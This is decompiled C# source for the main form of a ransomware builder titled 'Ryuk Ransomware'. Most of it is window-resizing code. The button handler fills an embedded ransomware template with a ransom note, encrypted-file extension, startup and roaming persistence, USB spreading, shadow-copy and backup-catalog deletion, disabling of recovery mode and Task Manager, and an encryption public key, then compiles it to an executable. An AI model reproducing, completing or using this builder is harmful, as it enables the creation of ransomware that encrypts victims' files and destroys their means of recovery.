            this.RightTopPanel_2.MouseMove += new MouseEventHandler(this.RightTopPanel_2_MouseMove);
            this.RightTopPanel_2.MouseUp += new MouseEventHandler(this.RightTopPanel_2_MouseUp);
            this.textBox1.Anchor = AnchorStyles.Right | AnchorStyles.Left | AnchorStyles.Bottom | AnchorStyles.Top;
            this.textBox1.BackColor = Color.FromArgb(30, 30, 30);
            this.textBox1.BorderStyle = BorderStyle.None;
            this.textBox1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, 0);
            this.textBox1.ForeColor = SystemColors.Window;
            this.textBox1.Location = new Point(12, 80);
            this.textBox1.Multiline = true;
            this.textBox1.Name = "textBox1";
            this.textBox1.ScrollBars = ScrollBars.Vertical;
            this.textBox1.Size = new Size(0x341, 0x138);
            this.textBox1.TabIndex = 0x12;
            this.textBox1.Text = manager.GetString("textBox1.Text");
            this.textBox1.MouseClick += new MouseEventHandler(this.textBox1_MouseClick);
            this.textBox1.TextChanged += new EventHandler(this.textBox1_TextChanged);
            this.saveFileDialog1.FileOk += new CancelEventHandler(this.saveFileDialog1_FileOk);
            this.openFileDialog1.FileName = "openFileDialog1";
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            this.AutoScroll = true;
            this.BackColor = Color.FromArgb(30, 30, 30);
            base.ClientSize = new Size(0x34f, 0x220);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.RightTopPanel_2);
            base.Controls.Add(this.RightTopPanel_1);
            base.Controls.Add(this.LeftBottomPanel_2);
            base.Controls.Add(this.RightBottomPanel_2);
            base.Controls.Add(this.RightBottomPanel_1);
            base.Controls.Add(this.RightPanel);
            base.Controls.Add(this.TopPanel);
            base.Controls.Add(this.panel2);
            base.FormBorderStyle = FormBorderStyle.None;
            base.Icon = (Icon) manager.GetObject("$this.Icon");
            this.MinimumSize = new Size(0x34f, 0x220);
            base.Name = "BlackForm";
            base.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Ryuk Ransomware";
            base.Load += new EventHandler(this.BlackForm_Load);
            this.TopPanel.ResumeLayout(false);
            this.TopPanel.PerformLayout();
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            ((ISupportInitialize) this.pictureBox1).EndInit();
            base.ResumeLayout(false);
            base.PerformLayout();
        }

        private void LeftBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
        {
            this.isLeftBottomPanelDragged = true;
        }

        private void LeftBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
        {
            if ((e.X < base.Location.X) && (this.isLeftBottomPanelDragged || (base.Height < 50)))
            {
                if (base.Width < 100)
                {
                    base.Width = 100;
                    base.Height = 50;
                    this.isLeftBottomPanelDragged = false;
                }
                else
                {
                    base.Location = new Point(base.Location.X + e.X, base.Location.Y);
                    base.Width -= e.X;
                    base.Height += e.Y;
                }
            }
        }

        private void LeftBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
        {
            this.isLeftBottomPanelDragged = false;
        }

        private void LeftBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
        {
            this.LeftBottomPanel_1_MouseDown(sender, e);
        }

        private void LeftBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
        {
            this.LeftBottomPanel_1_MouseMove(sender, e);
        }

        private void LeftBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
        {
            this.LeftBottomPanel_1_MouseUp(sender, e);
        }

        private void LeftPanel_MouseDown(object sender, MouseEventArgs e)
        {
            if ((base.Location.X > 0) && (e.X >= 0))
            {
                this.isLeftPanelDragged = e.Button == MouseButtons.Left;
            }
            else
            {
                this.isLeftPanelDragged = false;
                base.Location = new Point(10, base.Location.Y);
            }
        }

        private void LeftPanel_MouseMove(object sender, MouseEventArgs e)
        {
            if ((e.X < base.Location.X) && this.isLeftPanelDragged)
            {
                if (base.Width < 100)
                {
                    base.Width = 100;
                    this.isLeftPanelDragged = false;
                }
                else
                {
                    base.Location = new Point(base.Location.X + e.X, base.Location.Y);
                    base.Width -= e.X;
                }
            }
        }

        private void LeftPanel_MouseUp(object sender, MouseEventArgs e)
        {
            this.isLeftPanelDragged = false;
        }

        private void LeftTopPanel_1_MouseDown(object sender, MouseEventArgs e)
        {
            this.isLeftTopPanelDragged = true;
        }

        private void LeftTopPanel_1_MouseMove(object sender, MouseEventArgs e)
        {
            if (((e.X < base.Location.X) || (e.Y < base.Location.Y)) && this.isLeftTopPanelDragged)
            {
                if ((base.Width < 100) || (base.Height < 50))
                {
                    base.Width = 100;
                    base.Height = 100;
                    this.isLeftTopPanelDragged = false;
                }
                else
                {
                    base.Location = new Point(base.Location.X + e.X, base.Location.Y);
                    base.Width -= e.X;
                    base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
                    base.Height -= e.Y;
                }
            }
        }

        private void LeftTopPanel_1_MouseUp(object sender, MouseEventArgs e)
        {
            this.isLeftTopPanelDragged = false;
        }

        private void LeftTopPanel_2_MouseDown(object sender, MouseEventArgs e)
        {
            this.LeftTopPanel_1_MouseDown(sender, e);
        }

        private void LeftTopPanel_2_MouseMove(object sender, MouseEventArgs e)
        {
            this.LeftTopPanel_1_MouseMove(sender, e);
        }

        private void LeftTopPanel_2_MouseUp(object sender, MouseEventArgs e)
        {
            this.LeftTopPanel_1_MouseUp(sender, e);
        }

        private void panel2_Paint(object sender, PaintEventArgs e)
        {
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            OpenFileDialog objA = new OpenFileDialog();
            try
            {
                objA.Filter = "Icons (*.ico)|*.ico";
                if (objA.ShowDialog() == DialogResult.OK)
                {
                    this.iconLocation = objA.FileName;
                    this.pictureBox1.Image = Bitmap.FromHicon(new Icon(objA.FileName, new Size(60, 60)).Handle);
                    this.selectIconLabel.Text = "";
                }
            }
            finally
            {
                if (!ReferenceEquals(objA, null))
                {
                    objA.Dispose();
                }
            }
        }

        private void RightBottomPanel_1_MouseDown(object sender, MouseEventArgs e)
        {
            this.isRightBottomPanelDragged = true;
        }

        private void RightBottomPanel_1_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.isRightBottomPanelDragged)
            {
                if ((base.Width >= 100) && (base.Height >= 50))
                {
                    base.Width += e.X;
                    base.Height += e.Y;
                }
                else
                {
                    base.Width = 100;
                    base.Height = 50;
                    this.isRightBottomPanelDragged = false;
                }
            }
        }

        private void RightBottomPanel_1_MouseUp(object sender, MouseEventArgs e)
        {
            this.isRightBottomPanelDragged = false;
        }

        private void RightBottomPanel_2_MouseDown(object sender, MouseEventArgs e)
        {
            this.RightBottomPanel_1_MouseDown(sender, e);
        }

        private void RightBottomPanel_2_MouseMove(object sender, MouseEventArgs e)
        {
            this.RightBottomPanel_1_MouseMove(sender, e);
        }

        private void RightBottomPanel_2_MouseUp(object sender, MouseEventArgs e)
        {
            this.RightBottomPanel_1_MouseUp(sender, e);
        }

        private void RightPanel_MouseDown(object sender, MouseEventArgs e)
        {
            this.isRightPanelDragged = e.Button == MouseButtons.Left;
        }

        private void RightPanel_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.isRightPanelDragged)
            {
                if (base.Width >= 100)
                {
                    base.Width += e.X;
                }
                else
                {
                    base.Width = 100;
                    this.isRightPanelDragged = false;
                }
            }
        }

        private void RightPanel_MouseUp(object sender, MouseEventArgs e)
        {
            this.isRightPanelDragged = false;
        }

        private void RightTopPanel_1_MouseDown(object sender, MouseEventArgs e)
        {
            this.isRightTopPanelDragged = true;
        }

        private void RightTopPanel_1_MouseMove(object sender, MouseEventArgs e)
        {
            if (((e.Y < base.Location.Y) || (e.X < base.Location.X)) && this.isRightTopPanelDragged)
            {
                if ((base.Height < 50) || (base.Width < 100))
                {
                    base.Height = 50;
                    base.Width = 100;
                    this.isRightTopPanelDragged = false;
                }
                else
                {
                    base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
                    base.Height -= e.Y;
                    base.Width += e.X;
                }
            }
        }

        private void RightTopPanel_1_MouseUp(object sender, MouseEventArgs e)
        {
            this.isRightTopPanelDragged = false;
        }

        private void RightTopPanel_2_MouseDown(object sender, MouseEventArgs e)
        {
            this.RightTopPanel_1_MouseDown(sender, e);
        }

        private void RightTopPanel_2_MouseMove(object sender, MouseEventArgs e)
        {
            this.RightTopPanel_1_MouseMove(sender, e);
        }

        private void RightTopPanel_2_MouseUp(object sender, MouseEventArgs e)
        {
            this.RightTopPanel_1_MouseUp(sender, e);
        }

        private void run_button_Click(object sender, EventArgs e)
        {
        }

        private void saveFileDialog1_FileOk(object sender, CancelEventArgs e)
        {
        }

        private void selectIconLabel_Click(object sender, EventArgs e)
        {
            OpenFileDialog objA = new OpenFileDialog();
            try
            {
                objA.Filter = "Icons (*.ico)|*.ico";
                if (objA.ShowDialog() == DialogResult.OK)
                {
                    this.iconLocation = objA.FileName;
                    this.pictureBox1.Image = Bitmap.FromHicon(new Icon(objA.FileName, new Size(60, 60)).Handle);
                    this.selectIconLabel.Text = "";
                }
            }
            finally
            {
                if (!ReferenceEquals(objA, null))
                {
                    objA.Dispose();
                }
            }
        }

        private void shapedButton1_Click(object sender, EventArgs e)
        {
            new advancedSettingForm().ShowDialog();
        }

        private void shapedButton2_Click(object sender, EventArgs e)
        {
            new extensions().ShowDialog();
        }

        private void shapedButton3_Click(object sender, EventArgs e)
        {
            new Form2().ShowDialog();
        }

        private void shapedButton4_Click(object sender, EventArgs e)
        {
            string str;
            bool flag2;
            if (this.textBox1.Text.Trim().Length >= 1)
            {
                if (!string.IsNullOrWhiteSpace("aa"))
                {
                    StringBuilder builder = new StringBuilder();
                    int index = 0;
                    while (true)
                    {
                        flag2 = index < this.textBox1.Lines.Length;
                        if (flag2)
                        {
                            builder.Append("\"" + this.textBox1.Lines[index] + "\",\n");
                            index++;
                            continue;
                        }
                        str = Resources.Source.Replace("#messages", builder.ToString());
                        if (this.checkBox1.Checked)
                        {
                            str = str.Replace("#encryptedFileExtension", "");
                        }
                        else
                        {
                            string text = this.textBox2.Text;
                            if (text.Contains("."))
                            {
                                text = text.Replace(".", "");
                            }
                            str = str.Replace("#encryptedFileExtension", text);
                        }
                        if (!this.checkBox2.Checked)
                        {
                            str = str.Replace("#copyRoaming", "false").Replace("#exeName", this.textBox4.Text);
                        }
                        else if (this.textBox4.Text.Trim().Length >= 1)
                        {
                            str = !this.textBox4.Text.EndsWith(".exe") ? str.Replace("#copyRoaming", "true").Replace("#exeName", this.textBox4.Text + ".exe") : str.Replace("#copyRoaming", "true").Replace("#exeName", this.textBox4.Text);
                        }
                        else
                        {
                            MessageBox.Show("Proccess name field is empty");
                            return;
                        }
                        if (!this.usbSpreadCheckBox.Checked)
                        {
                            str = str.Replace("#checkSpread", "false").Replace("#spreadName", this.spreadNameText.Text);
                        }
                        else if (this.spreadNameText.Text.Trim().Length >= 1)
                        {
                            str = !this.spreadNameText.Text.EndsWith(".exe") ? str.Replace("#checkSpread", "true").Replace("#spreadName", this.spreadNameText.Text + ".exe") : str.Replace("#checkSpread", "true").Replace("#spreadName", this.spreadNameText.Text);
                        }
                        else
                        {
                            MessageBox.Show("Usb spread name field is empty");
                            return;
                        }
                        str = !this.startupcheckBox3.Checked ? str.Replace("#startupFolder", "true") : str.Replace("#startupFolder", "true");
                        str = !this.sleepCheckBox.Checked ? str.Replace("#checkSleep", "false").Replace("#sleepTextbox", this.SleepTextBox.Text) : str.Replace("#checkSleep", "true").Replace("#sleepTextbox", this.SleepTextBox.Text);
                        str = !Settings.Default.checkAdminPrivilage ? str.Replace("#adminPrivilage", "false") : str.Replace("#adminPrivilage", "true");
                        str = !Settings.Default.deleteBackupCatalog ? str.Replace("#checkdeleteBackupCatalog", "false") : str.Replace("#checkdeleteBackupCatalog", "true");
                        str = !Settings.Default.deleteShadowCopies ? str.Replace("#checkdeleteShadowCopies", "false") : str.Replace("#checkdeleteShadowCopies", "true");
                        str = !Settings.Default.disableRecoveryMode ? str.Replace("#checkdisableRecoveryMode", "false") : str.Replace("#checkdisableRecoveryMode", "true");
                        str = !Settings.Default.disableTaskManager ? str.Replace("#checkdisableTaskManager", "false") : str.Replace("#checkdisableTaskManager", "true");
                        if (this.droppedMessageTextbox.Text.Trim().Length >= 1)
                        {
                            str = str.Replace("#droppedMessageTextbox", this.droppedMessageTextbox.Text);
                            string publicKey = Settings.Default.publicKey;
                            if (!Settings.Default.encryptOption)
                            {
                                str = str.Replace("#encryptOption", "false").Replace("#publicKey", "");
                            }
                            else
                            {
                                flag2 = publicKey == "";
                                if (flag2)
                                {
                                    MessageBox.Show("Decrypter name field is empty. Go to advanced option and create or select decrypter", "Advanced Option");
                                    return;
                                }
                                else
                                {
                                    StringReader reader = new StringReader(publicKey);
                                    try
                                    {
                                        StringBuilder builder2 = new StringBuilder();
                                        while (true)
                                        {
                                            string str4;
                                            flag2 = !ReferenceEquals(str4 = reader.ReadLine(), null);
                                            if (!flag2)
                                            {
                                                str = str.Replace("#encryptOption", "true").Replace("#publicKey", builder2.ToString());
                                                break;
                                            }
                                            builder2.AppendLine("pubclicKey.AppendLine(\"" + str4.Replace("\"", "\\\"") + "\");");
                                        }
                                    }
                                    finally
                                    {
                                        if (!ReferenceEquals(reader, null))
                                        {
                                            reader.Dispose();
                                        }
                                    }
                                }
                            }
                        }
                        else
                        {
                            MessageBox.Show("Dropped message name field is empty");
                            return;
                        }
                        break;
                    }
                }
                else
                {
                    MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
            }
            else
            {
                MessageBox.Show("Please type your message!", "Read_it.txt", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                return;
            }
            if (Settings.Default.base64Image != "")
            {
                str = str.Replace("#base64Image", Settings.Default.base64Image);
            }
            flag2 = Settings.Default.extensions == "";
            if (!flag2)
            {
                str = str.Replace("#extensions", Settings.Default.extensions);
            }
            SaveFileDialog objA = new SaveFileDialog();
            try
            {
                objA.Filter = "Executable (*.exe)|*.exe";
                if (objA.ShowDialog() == DialogResult.OK)
                {
                    Compiler compiler1 = new Compiler(str, objA.FileName, this.iconLocation);
                }
            }
            finally
            {
                if (!ReferenceEquals(objA, null))
                {
                    objA.Dispose();
                }
            }
        }

        private void SleepTextBox_KeyPress_1(object sender, KeyPressEventArgs e)
        {
            if (!(char.IsControl(e.KeyChar) || char.IsDigit(e.KeyChar)))
            {
                e.Handled = true;
            }
        }

        private void textBox1_MouseClick(object sender, MouseEventArgs e)
        {
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
        }

        private void TopBorderPanel_MouseDown(object sender, MouseEventArgs e)
        {
            this.isTopBorderPanelDragged = e.Button == MouseButtons.Left;
        }

        private void TopBorderPanel_MouseMove(object sender, MouseEventArgs e)
        {
            if ((e.Y < base.Location.Y) && this.isTopBorderPanelDragged)
            {
                if (base.Height < 50)
                {
                    base.Height = 50;
                    this.isTopBorderPanelDragged = false;
                }
                else
                {
                    base.Location = new Point(base.Location.X, base.Location.Y + e.Y);
                    base.Height -= e.Y;
                }
            }
        }

        private void TopBorderPanel_MouseUp(object sender, MouseEventArgs e)
        {
            this.isTopBorderPanelDragged = false;
        }

        private void TopPanel_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button != MouseButtons.Left)
            {
                this.isTopPanelDragged = false;
            }
            else
            {
                this.isTopPanelDragged = true;
                Point point = base.PointToScreen(new Point(e.X, e.Y));
                this.offset = new Point();
                this.offset.X = base.Location.X - point.X;
                this.offset.Y = base.Location.Y - point.Y;
            }
            if (e.Clicks == 2)
            {
                this.isTopPanelDragged = false;
                this._MaxButton_Click(sender, e);
            }
        }

        private void TopPanel_MouseMove(object sender, MouseEventArgs e)
        {
            if (this.isTopPanelDragged)
            {
                Point point = this.TopPanel.PointToScreen(new Point(e.X, e.Y));
                point.Offset(this.offset);
                base.Location = point;
                if (((base.Location.X > 2) || (base.Location.Y > 2)) && (base.WindowState == FormWindowState.Maximized))
                {
                    base.Location = this._normalWindowLocation;
                    base.Size = this._normalWindowSize;
                    this._MaxButton.CFormState = MinMaxButton.CustomFormState.Normal;
                    this.isWindowMaximized = false;
                }
            }
        }

        private void TopPanel_MouseUp(object sender, MouseEventArgs e)
        {
            this.isTopPanelDragged = false;
            if ((base.Location.Y <= 5) && !this.isWindowMaximized)
            {
                this._normalWindowSize = base.Size;
                this._normalWindowLocation = base.Location;
                Rectangle workingArea = Screen.PrimaryScreen.WorkingArea;
                base.Location = new Point(0, 0);
                base.Size = new Size(workingArea.Width, workingArea.Height);
                this._MaxButton.CFormState = MinMaxButton.CustomFormState.Maximize;
                this.isWindowMaximized = true;
            }
        }

        private void TopPanel_Paint(object sender, PaintEventArgs e)
        {
        }

        private void usbSpreadCheckBox_CheckedChanged(object sender, EventArgs e)
        {
            this.spreadNameText.Enabled = !this.spreadNameText.Enabled;
        }

        private void view_button_Click(object sender, EventArgs e)
        {
        }

        private void WindowTextLabel_MouseDown(object sender, MouseEventArgs e)
        {
            this.TopPanel_MouseDown(sender, e);
        }

        private void WindowTextLabel_MouseMove(object sender, MouseEventArgs e)
        {
            this.TopPanel_MouseMove(sender, e);
        }

        private void WindowTextLabel_MouseUp(object sender, MouseEventArgs e)
        {
            this.TopPanel_MouseUp(sender, e);
        }
    }
}
